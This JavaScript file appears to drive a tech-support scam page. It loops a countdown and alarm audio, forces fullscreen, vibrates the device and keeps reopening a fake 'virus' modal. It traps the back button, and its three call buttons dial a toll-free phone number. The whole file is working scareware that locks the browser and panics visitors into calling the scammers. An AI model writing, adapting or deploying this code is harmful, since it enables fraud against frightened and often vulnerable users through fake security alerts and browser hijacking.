$(document).ready(() => {
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      document.getElementById(
        "countdown-timer"
      ).innerText = `${minutes}:${seconds}`;

      // Decrease time by 1 second
      timeInSeconds--;

      // When the countdown reaches 0, restart the timer
      if (timeInSeconds < 0) {
        clearInterval(countdown);
        startCountdown(); // Restart the countdown
      }
    }, 1000);
  }

  // Start the countdown
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  // Select the button and audio player
  const audioPlayer = $("#audioPlayer")[0];
  const playButton = $("#playAudio");

  // Handle button click and play the audio after a delay
  playButton.on("click", () => {
    setTimeout(() => {
      audioPlayer.play()
        .then(() => {
          console.log("Audio is playing");
        })
        .catch(error => {
          console.error("Audio playback failed:", error);
        });
    }, 1000);
  });

  // Simulate a user interaction
  playButton.trigger("click");

  audioPlayer.onended = () => {
    audioPlayer.play()
  };

  // Function to go fullscreen
  function goFullScreenAndVibrate() {
    const element = document.documentElement;

    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.mozRequestFullScreen || element.webkitRequestFullscreen || element.msRequestFullscreen) {
      (element.mozRequestFullScreen || element.webkitRequestFullscreen || element.msRequestFullscreen).call(element);
    }

    navigator.vibrate(200);
    modalInstance.show(); // Show the modal
  }

  if (virusModal) {
    // Event listener for when modal is shown
    virusModal.addEventListener("show.bs.modal", (event) => {
      goFullScreenAndVibrate();
    });

    // Event listener for when modal is about to hide
    //   virusModal.addEventListener("hide.bs.modal", (event) => {
    //     console.log("Sagar");
    //   });

    // Event listener for when modal is completely hidden
    virusModal.addEventListener("hidden.bs.modal", (event) => {
      // Reopen the modal after 1 second
      setTimeout(() => {
        modalInstance.show();
        goFullScreenAndVibrate();
      }, 300); // 0.3 second delay
    });
  }

  window.addEventListener("touchstart", () => {
    if (virusModal) {
      goFullScreenAndVibrate();
    }
  });

  window.addEventListener("click", () => {
    if (virusModal) {
      goFullScreenAndVibrate();
    }
  });

  // Add event listener for button vibration
  $("#vibrateButton").on("click", () => {
    goFullScreenAndVibrate();
  });

  // Add event listener for button vibration
  $("#callButton").on("click", () => {
    // Replace with the desired phone number
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });
  $("#callButton1").on("click", () => {
    // Replace with the desired phone number
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });
  $("#callButton2").on("click", () => {
    // Replace with the desired phone number
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });

  // Prevent the backspace key from navigating back.
  history.pushState(null, null, window.location.href);
  history.back();
  window.onpopstate = () => history.forward();

});
